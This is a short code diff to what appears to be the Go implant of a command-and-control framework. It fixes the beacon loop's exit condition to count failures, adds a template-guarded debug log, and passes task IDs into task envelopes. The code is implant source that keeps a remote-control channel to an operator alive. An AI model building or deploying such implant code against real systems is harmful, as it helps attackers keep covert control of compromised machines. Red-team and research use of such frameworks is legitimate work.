@@ -62,11 +62,14 @@ func (t *C2) ServeBeacon() {
 	for {
 		select {
 		case <-t.closed:
+			// {{if .Config.Debug}}
+			log.Printf("[beacon] Exiting beaconing loop")
+			// {{end}}
 			return
 		default:
 			// Only exits when we have reached the maximum number
 			// of connection failures for this precise beaconing
-			if t.attempts > int(t.Profile.MaxConnectionErrors) {
+			if t.failures > int(t.Profile.MaxConnectionErrors) {
 				return
 			}
 
@@ -212,7 +215,7 @@ func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 			})
 		} else if handler, ok := transportHandlers[task.Type]; ok {
 			wg.Add(1)
-			var envelope = &pb.Envelope{Data: task.Data}
+			var envelope = &pb.Envelope{ID: task.ID, Data: task.Data}
 			taskID := task.ID
 			go handler(envelope, func(data []byte, err error) {
 				resultsMutex.Lock()
